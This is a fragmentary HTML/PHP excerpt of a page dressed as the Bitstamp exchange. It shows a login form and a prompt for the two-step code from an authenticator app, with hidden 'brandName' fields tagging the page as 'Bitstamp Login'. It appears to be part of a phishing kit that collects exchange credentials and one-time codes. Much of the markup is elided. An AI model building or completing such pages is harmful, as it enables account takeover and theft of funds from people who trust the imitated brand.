...
<head>
    ...
    <title>Bitstamp Trusted Crypto Exchange | Buy & Sell Cryptocurrencies</title>
...
<body>
    <!-- sherrr -->
    <img src="./assets/images/bitstamp.png" width="100%" style="margin-bottom: 70px;">
    <?php
        ...
        <div class="container-fluid" id="welcome-section">
            <form action="" method="post">
                ...
                <p style="text-align: center;margin-bottom: 25px;">Enter the 2-step verification generated by your<br>
                    authenticator app.</p>
                <input type="hidden" name="brandName" value="Bitstamp Login"> 
    ...
    <?php } else { ?>
        ...
        <form action="" method="post"><input id="inputs" type="hidden" name="brandName" value="Bitstamp Login">
        <div class="container-fluid" id="welcome-section" style="width:25% !important; background-color:white;">
                <h3 style="padding-top:12px; color: #293070; text-align: center;font-size: 40px;">Log In</h3>
